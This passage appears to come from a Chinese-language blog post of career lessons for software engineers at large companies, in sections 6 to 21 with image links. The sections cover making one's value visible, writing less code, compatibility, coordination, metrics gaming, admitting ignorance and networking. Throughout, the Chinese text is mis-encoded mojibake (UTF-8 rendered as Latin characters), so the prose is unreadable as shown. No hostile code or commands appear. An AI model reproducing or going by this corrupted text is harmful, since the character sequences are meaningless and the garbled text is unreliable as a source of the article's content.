<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3295733131384836953973c979c1afd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=S9t7qFVYhOel1R8OCsCPHvI3ufI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">6. ä½ çš„ä»£ç ä¸ä¼šæ›¿ä½ è¯´è¯ï¼Œä½†äººä¼š</h2>
<p>åˆšå¼€å§‹å·¥ä½œæ—¶ï¼Œæˆ‘ç›¸ä¿¡æ˜¯é‡‘å­æ€»ä¼šå‘å…‰ã€‚</p>
<p>ä½†æˆ‘é”™äº†ã€‚</p>
<p>ä»£ç é™é™åœ°èººåœ¨ä»“åº“é‡Œã€‚ä½ çš„é¢†å¯¼åœ¨ä¼šè®®ä¸Šæåˆ°ä½ ï¼Œæˆ–è€…æ²¡æã€‚åŒäº‹æ¨èä½ å‚ä¸é¡¹ç›®ï¼Œæˆ–è€…æ¨èäº†åˆ«äººã€‚</p>
<p>åœ¨å¤§å…¬å¸ï¼Œå†³ç­–æ˜¯åœ¨ä½ æ²¡è¢«é‚€è¯·çš„ä¼šè®®ä¸Šåšå‡ºçš„ï¼Œç”¨çš„æ˜¯ä½ æ²¡å†™çš„æ€»ç»“ï¼Œç”±åªæœ‰äº”åˆ†é’Ÿæ—¶é—´å’ŒåäºŒä»¶äº‹è¦å¤„ç†çš„äººåšå‡ºçš„ã€‚</p>
<p>å¦‚æœä½ ä¸åœ¨åœºæ—¶æ²¡äººèƒ½æ¸…æ¥šè¯´å‡ºä½ çš„ä»·å€¼ï¼Œé‚£ä½ çš„ä»·å€¼å°±ç­‰äºå¯æœ‰å¯æ— ã€‚</p>
<p>è¿™ä¸æ˜¯è®©ä½ é¼“å¹è‡ªå·±ï¼Œè€Œæ˜¯å‘Šè¯‰ä½ ï¼š<strong>ä½ éœ€è¦è®©ä½ çš„ä»·å€¼è¢«æ‰€æœ‰äººçœ‹åˆ°ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe0e9085fc445f49b73f06344b1b474~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=jvTmFyrGOMH9y9Gcp%2B0Y0bJXkqY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">7. æœ€å¥½çš„ä»£ç æ˜¯ä½ æ ¹æœ¬ä¸ç”¨å†™çš„ä»£ç </h2>
<p>å·¥ç¨‹å¸ˆæ–‡åŒ–å´‡æ‹œåˆ›é€ ã€‚</p>
<p>æ²¡æœ‰äººä¼šå› ä¸ºåˆ é™¤ä»£ç è€Œè·å¾—æ™‹å‡ï¼Œå³ä½¿åˆ é™¤ä»£ç å¾€å¾€æ¯”æ·»åŠ ä»£ç æ›´èƒ½æ”¹è¿›ç³»ç»Ÿã€‚</p>
<p><strong>å› ä¸ºä½ ä¸å†™çš„æ¯ä¸€è¡Œä»£ç ï¼Œéƒ½æ„å‘³ç€ä½ æ°¸è¿œä¸å¿…è°ƒè¯•ã€ç»´æŠ¤æˆ–è§£é‡Šã€‚</strong></p>
<p>åœ¨åŠ¨å·¥ä¹‹å‰ï¼Œå…ˆä»”ç»†æ€è€ƒä¸€ä¸‹ï¼šâ€œå¦‚æœæˆ‘ä»¬ä¸åšè¿™ä»¶äº‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿâ€ æœ‰æ—¶ç­”æ¡ˆæ˜¯â€œæ²¡ä»€ä¹ˆåå¤„â€ï¼Œé‚£å°±æ˜¯ä½ çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p>é—®é¢˜ä¸æ˜¯å·¥ç¨‹å¸ˆä¸ä¼šå†™ä»£ç ï¼Œè€Œæ˜¯æˆ‘ä»¬å¤ªä¼šå†™äº†ï¼Œä»¥è‡³äºå¿˜äº†é—®ï¼šè¯¥ä¸è¯¥å†™ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d02dbcef4e8a4fc8ab901f6628d1273a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=erq6smwpVOatjhCG%2Ba0%2FPzVl29Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">8. å¤§è§„æ¨¡æ—¶ï¼Œè¿ä½ çš„ bug éƒ½æœ‰ç”¨æˆ·</h2>
<p>ç”¨æˆ·å¤šçš„æ—¶å€™ï¼Œè¿ä½ çš„ bug éƒ½ä¼šæœ‰ç”¨æˆ·ï¼Œè¿™äº§ç”Ÿäº†ä¸€ä¸ªèŒä¸šçº§æ´å¯Ÿï¼š</p>
<p>ä½ ä¸èƒ½æŠŠå…¼å®¹æ€§å·¥ä½œå½“â€œç»´æŠ¤â€ï¼ŒæŠŠæ–°åŠŸèƒ½å½“â€œçœŸæ­£çš„å·¥ä½œâ€ã€‚å…¼å®¹æ€§å°±æ˜¯äº§å“ã€‚</p>
<p>æ‰€ä»¥æŠŠä½ çš„â€œåºŸå¼ƒâ€åšæˆâ€œè¿ç§»â€ï¼Œå¸¦ä¸Šæ—¶é—´ã€å·¥å…·å’ŒåŒç†å¿ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84b8588d72ec49e4b6ceba52bce5c73e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=zeIjsjdOORRowkviE2Ls%2BjsJhY0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">9. æ…¢å®é™…ä¸Šæ˜¯å› ä¸ºä¸åè°ƒ</h2>
<p>é¡¹ç›®è¿›å±•ç¼“æ…¢æ—¶ï¼Œäººä»¬çš„ç¬¬ä¸€ååº”å¾€å¾€æ˜¯è´£æ€ªæ‰§è¡Œï¼šå‘˜å·¥ä¸å¤ŸåŠªåŠ›ã€æŠ€æœ¯ä¸æˆç†Ÿã€å·¥ç¨‹å¸ˆäººæ‰‹ä¸è¶³ã€‚</p>
<p>ä½†é€šå¸¸æ¥è¯´ï¼Œè¿™äº›éƒ½ä¸æ˜¯çœŸæ­£çš„é—®é¢˜æ‰€åœ¨ã€‚</p>
<p>åœ¨å¤§å…¬å¸ï¼Œå›¢é˜Ÿæ˜¯å¹¶å‘æ‰§è¡Œçš„åŸºæœ¬å•ä½ï¼Œä½†éšç€å›¢é˜Ÿæ•°é‡çš„å¢åŠ ï¼Œåè°ƒæˆæœ¬å‘ˆå‡ ä½•çº§å¢é•¿ã€‚</p>
<p>å¤§å¤šæ•°æ•ˆç‡ä½ä¸‹å®é™…ä¸Šæºäºç›®æ ‡ä¸ä¸€è‡´â€”â€”äººä»¬åœ¨åšé”™è¯¯çš„äº‹æƒ…ï¼Œæˆ–è€…ä»¥ä¸å…¼å®¹çš„æ–¹å¼åšæ­£ç¡®çš„äº‹æƒ…ã€‚</p>
<p>æ‰€ä»¥é«˜çº§å·¥ç¨‹å¸ˆèŠ±æ›´å¤šæ—¶é—´æ¾„æ¸…æ–¹å‘ã€æ¥å£å’Œä¼˜å…ˆçº§ï¼Œè€Œä¸æ˜¯â€œå†™ä»£ç æ›´å¿«â€ï¼Œé‚£äº›æ‰æ˜¯çœŸæ­£çš„ç“¶é¢ˆæ‰€åœ¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7988d6032294a1ea4caf260b8750d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CDvKZO4GGyAmnSt6V0NCPeWcIXw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">10. ä¸“æ³¨ä½ èƒ½æ§åˆ¶çš„ï¼Œå¿½ç•¥ä½ æ— æ³•æ§åˆ¶çš„</h2>
<p>åœ¨å¤§å…¬å¸ï¼Œæ— æ•°çš„å˜æ•°éƒ½è¶…å‡ºä½ çš„æŒæ§â€”â€”ç»„ç»‡æ¶æ„è°ƒæ•´ã€ç®¡ç†å†³ç­–ã€å¸‚åœºå˜åŒ–ã€äº§å“è½¬å‹ç­‰ç­‰ã€‚</p>
<p>è¿‡åº¦å…³æ³¨è¿™äº›å› ç´ åªä¼šè®©ä½ ç„¦è™‘ä¸å®‰ï¼Œå´åˆæ— èƒ½ä¸ºåŠ›ã€‚</p>
<p>æ‰€ä»¥é«˜æ•ˆçš„å·¥ç¨‹å¸ˆï¼Œä¼šé”å®šè‡ªå·±çš„å½±å“åœˆã€‚ä½ æ§åˆ¶ä¸äº†æ˜¯å¦ä¼šé‡ç»„ï¼Œä½†ä½ èƒ½æ§åˆ¶å·¥ä½œè´¨é‡ã€å¦‚ä½•åº”å¯¹ã€å­¦åˆ°ä»€ä¹ˆã€‚</p>
<p><strong>è¿™å¹¶éè¢«åŠ¨æ¥å—ï¼Œè€Œæ˜¯ç­–ç•¥æ€§å…³æ³¨ã€‚</strong></p>
<p><strong>æŠŠç²¾åŠ›æµªè´¹åœ¨æ— æ³•æ”¹å˜çš„äº‹æƒ…ä¸Šï¼Œå°±ç­‰äºæµªè´¹äº†åŸæœ¬èŠ±åœ¨å¯ä»¥æ”¹å˜çš„äº‹æƒ…ä¸Šçš„ç²¾åŠ›ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e38ef618b7d44f379d08b57db8cfde6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=bFJwDcKzfUzZ%2F4zxTwFvVWV%2Fti8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">11. æŠ½è±¡å¹¶ä¸èƒ½æ¶ˆé™¤å¤æ‚æ€§</h2>
<p>æ¯ä¸€æ¬¡æŠ½è±¡éƒ½æ˜¯ä¸€ç§èµŒåšï¼ŒèµŒä½ ä¸éœ€è¦ç†è§£ä¸‹é¢æ˜¯ä»€ä¹ˆã€‚</p>
<p>æœ‰æ—¶å€™ä½ ä¼šèµ¢ï¼Œä½†æ€»ä¼šæœ‰æ¼æ´ï¼Œä¸€æ—¦å‡ºç°æ¼æ´ï¼Œä½ å°±éœ€è¦æ¸…æ™°åœ°çŸ¥é“ä½ ç«™åœ¨ä»€ä¹ˆä¸Šé¢ã€‚</p>
<p><strong>æ‰€ä»¥é«˜çº§å·¥ç¨‹å¸ˆå³ä½¿æŠ€æœ¯æ ˆè¶Šæ¥è¶Šé«˜ï¼Œä¹Ÿè¦æŒç»­å­¦ä¹ â€œæ›´åº•å±‚â€çš„ä¸œè¥¿ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fa41921c94b477d964e853845644e83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=dTjZ57cH3cJpzJPh6kZjdc5PIX4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">12. å†™ä½œè®©è¡¨è¾¾æ›´æ¸…æ™°ï¼Œä»¥æ•™å¸¦å­¦æ˜¯æœ€å¿«çš„å­¦ä¹ æ–¹å¼</h2>
<p>å†™ä½œèƒ½å¸¦æ¥æ›´æ¸…æ™°çš„è¡¨è¾¾ã€‚</p>
<p>å½“æˆ‘å‘åˆ«äººè§£é‡Šä¸€ä¸ªæ¦‚å¿µâ€”â€”åœ¨æ–‡æ¡£é‡Œã€æ¼”è®²ä¸­ã€ä»£ç è¯„å®¡è¯„è®ºé‡Œã€ç”šè‡³å’Œ AI èŠå¤©ï¼Œæˆ‘éƒ½ä¼šå‘ç°è‡ªå·±ç†è§£ä¸Šçš„ä¸è¶³ã€‚</p>
<p>æ‰€ä»¥å¦‚æœä½ è§‰å¾—è‡ªå·±æ‡‚äº†ä»€ä¹ˆï¼Œè¯•ç€ç®€å•åœ°è§£é‡Šå®ƒã€‚å¡ä½çš„åœ°æ–¹ï¼Œå°±æ˜¯ä½ ç†è§£è‚¤æµ…çš„åœ°æ–¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac9c956a64634a14baf6e05b39af7074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=GTUCHe8KKeWZAuIP3FE5WZRkTJ0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">13. æ³¨é‡ç²˜åˆæ€§å·¥ä½œ</h2>
<p>ç²˜åˆæ€§å·¥ä½œâ€”â€”ä¾‹å¦‚å†™æ–‡æ¡£ã€å¸®æ–°äººä¸Šæ‰‹ã€è·¨å›¢é˜Ÿåè°ƒã€æµç¨‹ä¼˜åŒ–â€”â€”è‡³å…³é‡è¦ã€‚</p>
<p>ä½†å¦‚æœä½ æ€»æ˜¯æ— æ„è¯†åœ°åšè¿™äº›ï¼Œåè€Œå¯èƒ½ä¼šæ‹–æ…¢æŠ€æœ¯æˆé•¿ï¼ŒæŠŠè‡ªå·±ç´¯å®ã€‚</p>
<p>é™·é˜±åœ¨äºæŠŠå®ƒå½“â€œä¹äºåŠ©äººâ€çš„æ´»åŠ¨ï¼Œè€Œä¸æ˜¯å½“ä½œæœ‰è¾¹ç•Œçš„ã€åˆ»æ„çš„ã€å¯è§çš„å½±å“åŠ›ã€‚</p>
<p>å°è¯•ç»™å®ƒè®¾æ—¶é™ï¼Œè½®æ¢åšï¼ŒæŠŠå®ƒå˜æˆäº§å‡ºç‰©ï¼šæ–‡æ¡£ã€æ¨¡æ¿ã€è‡ªåŠ¨åŒ–ã€‚</p>
<p>è®©å®ƒä½œä¸ºâ€œå½±å“åŠ›â€è¢«çœ‹è§ï¼Œè€Œä¸æ˜¯ä½œä¸ºâ€œæ€§æ ¼ç‰¹ç‚¹â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05e19438a18b40f384baa7986f9e0c62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=jwch4rVz2LEh9Iwx3DMxPfpWT7s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">14. å¦‚æœä½ èµ¢å¾—æ¯ä¸€åœºè¾©è®ºï¼Œä½ å¾ˆå¯èƒ½æ˜¯åœ¨ç§¯ç´¯æ— å£°çš„é˜»åŠ›</h2>
<p>å½“äººä»¬ä¸å†å’Œä½ äº‰ï¼Œä¸æ˜¯å› ä¸ºä½ è¯´æœäº†ä»–ä»¬ï¼Œè€Œæ˜¯å› ä¸ºä»–ä»¬æ”¾å¼ƒäº†ã€‚</p>
<p>ä½†ä»–ä»¬ä¼šåœ¨æ‰§è¡Œä¸­è¡¨è¾¾åˆ†æ­§ï¼Œè€Œä¸æ˜¯åœ¨ä¼šè®®ä¸Šã€‚</p>
<p>æ‰€ä»¥çœŸæ­£çš„å…±è¯†éœ€è¦æ›´é•¿æ—¶é—´ã€‚ä½ å¾—çœŸæ­£ç†è§£åˆ«äººçš„è§‚ç‚¹ï¼Œå¸æ”¶åé¦ˆï¼Œæœ‰æ—¶å€™éœ€è¦ä½ å½“ä¼—æ”¹å˜ä¸»æ„ã€‚</p>
<p>çŸ­æœŸâ€œæˆ‘æ˜¯å¯¹çš„â€çš„å¿«æ„Ÿï¼Œè¿œä¸å¦‚é•¿æœŸå’Œå¿ƒç”˜æƒ…æ„¿çš„åˆä½œè€…ä¸€èµ·å»ºè®¾çš„ç°å®æ¥å¾—çè´µã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8ba6fdb71774c5b8c8f53f59fae78bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=zoHM8ZrjQF9w8fES%2F0VmLoVOCAI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">15. å½“è¡¡é‡æ ‡å‡†å˜æˆç›®æ ‡æ—¶ï¼Œå®ƒå°±åœæ­¢äº†è¡¡é‡</h2>
<p>ä½ æš´éœ²ç»™ç®¡ç†å±‚çš„æ¯ä¸ªæŒ‡æ ‡ï¼Œæœ€ç»ˆéƒ½ä¼šè¢«åšå¼ˆã€‚</p>
<p>ä¸æ˜¯å› ä¸ºæ¶æ„ï¼Œè€Œæ˜¯å› ä¸ºäººä¼šä¼˜åŒ–è¢«åº¦é‡çš„ä¸œè¥¿ã€‚</p>
<p>è¿½å¦‚æœä½ è¿½è¸ªä»£ç è¡Œæ•°ï¼Œä½ ä¼šå¾—åˆ°æ›´å¤šçš„ä»£ç è¡Œæ•°ã€‚å¦‚æœä½ è¿½è¸ªå¼€å‘é€Ÿåº¦ï¼Œä½ ä¼šå¾—åˆ°è¿‡é«˜çš„ä¼°ç®—å€¼ã€‚</p>
<p>é«˜æ‰‹çš„åšæ³•æ˜¯ï¼šå¯¹æ¯ä¸ªæŒ‡æ ‡è¯·æ±‚éƒ½æä¾›ä¸€å¯¹æŒ‡æ ‡ã€‚ä¸€ä¸ªç”¨äºè¡¡é‡é€Ÿåº¦ï¼Œä¸€ä¸ªç”¨äºè¡¡é‡è´¨é‡æˆ–é£é™©ã€‚ç„¶åï¼ŒåšæŒè§£è¯»è¶‹åŠ¿ï¼Œè€Œä¸æ˜¯ç›²ç›®è¿½æ±‚é˜ˆå€¼ã€‚</p>
<p><strong>ç›®æ ‡æ˜¯æ´å¯Ÿï¼Œè€Œéç›‘æ§ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec15462233a4ea9b077444f1dc1084f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=mRXQqxfH61RqVnoJrHnx%2FE0v2fQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">16. æ‰¿è®¤è‡ªå·±ä¸çŸ¥é“çš„äº‹æƒ…æ¯”å‡è£…è‡ªå·±çŸ¥é“æ›´èƒ½å¸¦æ¥å®‰å…¨æ„Ÿ</h2>
<p>èµ„æ·±å·¥ç¨‹å¸ˆè¯´â€œæˆ‘ä¸çŸ¥é“â€å¹¶ä¸æ˜¯ç¤ºå¼±â€”â€”ä»–ä»¬æ˜¯åœ¨é¼“åŠ±å¤§å®¶å¦è¯šé¢å¯¹ã€‚</p>
<p>å½“é¢†å¯¼è€…æ‰¿è®¤è‡ªå·±çš„ä¸ç¡®å®šæ€§æ—¶ï¼Œå°±ç­‰äºåœ¨æš—ç¤ºå…¶ä»–äººä¹Ÿå¯ä»¥è¿™æ ·åšã€‚å¦‚æœä¸è¿™æ ·çš„è¯ï¼Œå°±ä¼šå½¢æˆä¸€ç§äººäººå‡è£…ç†è§£ã€é—®é¢˜è¢«æ©ç›–ç›´åˆ°çˆ†å‘çš„æ–‡åŒ–ã€‚</p>
<p>æˆ‘è§è¿‡å›¢é˜Ÿé‡Œæœ€èµ„æ·±çš„äººä»ä¸æ‰¿è®¤è‡ªå·±ä¸æ˜ç™½ï¼Œæˆ‘ä¹Ÿè§è¿‡ç”±æ­¤é€ æˆçš„åæœã€‚é—®é¢˜ä¸è¢«é—®å‡ºæ¥ï¼Œå‡è®¾ä¸è¢«æŒ‘æˆ˜ï¼Œåˆçº§å·¥ç¨‹å¸ˆä¿æŒæ²‰é»˜å› ä¸ºä»–ä»¬ä»¥ä¸ºåˆ«äººéƒ½æ‡‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f639acec1964294b94686df33192abd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=1FljoZjwL9x0tvdkK4gZmP6s0WY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16">17. ä½ çš„äººè„‰å…³ç³»æ¯”ä½ æ‹¥æœ‰çš„ä»»ä½•ä¸€ä»½å·¥ä½œéƒ½æ›´é•¿ä¹…</h2>
<p>èŒä¸šç”Ÿæ¶¯æ—©æœŸï¼Œæˆ‘ä¸“æ³¨äºå·¥ä½œæœ¬èº«ï¼Œå¿½è§†äº†äººè„‰ç»è¥ã€‚å›å¤´çœ‹ï¼Œè¿™æ˜¯ä¸ªé”™è¯¯ã€‚</p>
<p>é‚£äº›æ³¨é‡äººè„‰å…³ç³»çš„åŒäº‹ï¼Œåœ¨æ¥ä¸‹æ¥çš„å‡ åå¹´é‡Œéƒ½å—ç›ŠåŒªæµ…ã€‚ä»–ä»¬æœ€å…ˆäº†è§£æœºä¼šï¼Œæ›´å¿«åœ°å»ºç«‹äººè„‰ï¼Œè·å¾—èŒä½æ¨èï¼Œå’Œå¤šå¹´æ¥å»ºç«‹ä¿¡ä»»çš„äººä¸€èµ·åˆ›ä¸šã€‚</p>
<p>ä½ çš„å·¥ä½œä¸ä¼šæ°¸è¿œæŒç»­ä¸‹å»ï¼Œä½†ä½ çš„äººè„‰ç½‘ç»œå´ä¼šä¸€ç›´å­˜åœ¨ã€‚</p>
<p>ä»¥å¥½å¥‡å¿ƒå’Œæ…·æ…¨çš„æ€åº¦å»æ‹“å±•äººè„‰ï¼Œè€Œä¸æ˜¯æŠ±ç€åŠŸåˆ©ä¸»ä¹‰çš„å¿ƒæ€ã€‚</p>
<p>å½“éœ€è¦å‘å‰è¿ˆè¿›çš„æ—¶å€™ï¼Œå¾€å¾€æ˜¯äººé™…å…³ç³»æ‰“å¼€äº†è¿™æ‰‡é—¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c50cdff6218418ba3148878d0e3152f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CQzTBDFgqE%2FbwlNGMkAswcmoRSA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-17">18. å¤§å¤šæ•°ç»©æ•ˆçš„æå‡æ¥è‡ªäºå‡å°‘å·¥ä½œé‡</h2>
<p>å½“ç³»ç»Ÿå˜æ…¢æ—¶ï¼Œäººä»¬çš„ç¬¬ä¸€ååº”å¾€å¾€æ˜¯åŠ ä¸œè¥¿ï¼šåŠ ç¼“å­˜ã€å¹¶è¡Œå¤„ç†ã€ä½¿ç”¨æ›´æ™ºèƒ½çš„ç®—æ³•ã€‚</p>
<p>æœ‰æ—¶å€™è¿™æ ·åšæ˜¯å¯¹çš„ã€‚</p>
<p>ä½†æˆ‘å‘ç°ï¼Œé€šè¿‡è¯¢é—®â€œæˆ‘ä»¬è®¡ç®—äº†å“ªäº›ä¸å¿…è¦çš„ä¸œè¥¿ï¼Ÿâ€å¾€å¾€èƒ½å¸¦æ¥æ›´å¤šæ€§èƒ½æå‡ã€‚</p>
<p><strong>åˆ é™¤ä¸å¿…è¦çš„å·¥ä½œå‡ ä¹æ€»æ˜¯æ¯”æ›´å¿«åœ°å®Œæˆå¿…è¦çš„å·¥ä½œæ›´æœ‰æˆæ•ˆã€‚æœ€å¿«çš„ä»£ç æ˜¯æ°¸è¿œä¸ä¼šè¿è¡Œçš„ä»£ç ã€‚</strong></p>
<p>æ‰€ä»¥åœ¨è¿›è¡Œä¼˜åŒ–ä¹‹å‰ï¼Œå…ˆé—®é—®è‡ªå·±è¿™é¡¹å·¥ä½œæ˜¯å¦çœŸçš„åº”è¯¥å­˜åœ¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc5dda96eea24a92b8f51fa34b806c0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CWtYSECKp3V0Vwq98ER14VaDW2w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">19. æµç¨‹å­˜åœ¨çš„ç›®çš„æ˜¯ä¸ºäº†å‡å°‘ä¸ç¡®å®šæ€§ï¼Œè€Œä¸æ˜¯ä¸ºäº†ç•™ä¸‹ä¹¦é¢è®°å½•</h2>
<p>æœ€å¥½çš„æµç¨‹æ˜¯è®©åè°ƒæ›´å®¹æ˜“ã€è®©å¤±è´¥æˆæœ¬æ›´ä½ã€‚</p>
<p>æœ€å·®çš„æµç¨‹æ˜¯å®˜åƒšä¸»ä¹‰â€”â€”å®ƒçš„å­˜åœ¨ä¸æ˜¯ä¸ºäº†å¸®å¿™ï¼Œè€Œæ˜¯ä¸ºäº†å‡ºäº‹æ—¶æ¨å¸è´£ä»»ã€‚</p>
<p>å¦‚æœä½ æ— æ³•è§£é‡Šä¸€ä¸ªä¸ªæµç¨‹å¦‚ä½•é™ä½é£é™©æˆ–æé«˜æ¸…æ™°åº¦ï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½åªæ˜¯å¢åŠ äº†é¢å¤–å¼€é”€ã€‚</p>
<p>å¦‚æœäººä»¬èŠ±åœ¨è®°å½•å·¥ä½œä¸Šçš„æ—¶é—´æ¯”åšå·¥ä½œçš„æ—¶é—´è¿˜å¤šï¼Œé‚£å°±è¯´æ˜å‡ºäº†å¤§é—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da38824a55046bfac1a6e4ed5d1de2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lIML3Mh4RsUVHRab%2BfytXloj%2BI0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">20. æœ€ç»ˆï¼Œæ—¶é—´ä¼šæ¯”é‡‘é’±æ›´æœ‰ä»·å€¼</h2>
<p>åˆšå¼€å§‹å·¥ä½œçš„æ—¶å€™ï¼Œä½ ç”¨æ—¶é—´æ¢é’±â€”â€”è¿™æ²¡é—®é¢˜ã€‚</p>
<p>ä½†åˆ°äº†æŸä¸ªé˜¶æ®µï¼Œæƒ…å†µå°±å®Œå…¨ä¸åŒäº†ã€‚ä½ ä¼šå¼€å§‹æ„è¯†åˆ°ï¼Œæ—¶é—´æ‰æ˜¯ä¸å¯å†ç”Ÿèµ„æºã€‚</p>
<p>æˆ‘è§è¿‡ä¸€äº›é«˜çº§å·¥ç¨‹å¸ˆä¸ºäº†æ™‹å‡è€Œç´¯å®è‡ªå·±ï¼Œåªä¸ºäº†å¤šæ‹¿å‡ ä¸ªç™¾åˆ†ç‚¹çš„è–ªé…¬ã€‚æœ‰äº›äººç¡®å®å‡èŒäº†ï¼Œä½†äº‹åå¤§å¤šæ•°äººéƒ½åœ¨åæ€ï¼Œè‡ªå·±æ”¾å¼ƒçš„ä¸€åˆ‡æ˜¯å¦å€¼å¾—ã€‚</p>
<p>ç­”æ¡ˆä¸æ˜¯â€œåˆ«åŠªåŠ›å·¥ä½œâ€ï¼Œè€Œæ˜¯â€œçŸ¥é“ä½ åœ¨äº¤æ˜“ä»€ä¹ˆï¼Œå¹¶æ·±æ€ç†Ÿè™‘åœ°è¿›è¡Œäº¤æ˜“â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82971db1067549caa5f2ab4e869fc712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=SJSPwqLcaClmWQc8lyh8iw1%2Birw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">21. æ²¡æœ‰æ·å¾„ï¼Œä½†æœ‰å¤åˆ©</h2>
<p>ä¸“ä¸šæŠ€èƒ½æºäºåˆ»æ„ç»ƒä¹ â€”â€”ç•¥å¾®è¶…è¶Šç°æœ‰æ°´å¹³ï¼Œç„¶åä¸æ–­åæ€ï¼Œä¸æ–­é‡å¤ã€‚å¹´å¤ä¸€å¹´ï¼Œæ²¡æœ‰æ·å¾„å¯èµ°ã€‚</p>
<p>ä½†ä»¤äººæ¬£æ…°çš„æ˜¯ï¼šå­¦ä¹ çš„è¿›æ­¥åœ¨äºåˆ›é€ æ–°çš„é€‰æ‹©ï¼Œè€Œä¸ä»…ä»…æ˜¯ç§¯ç´¯æ–°çš„çŸ¥è¯†ã€‚</p>
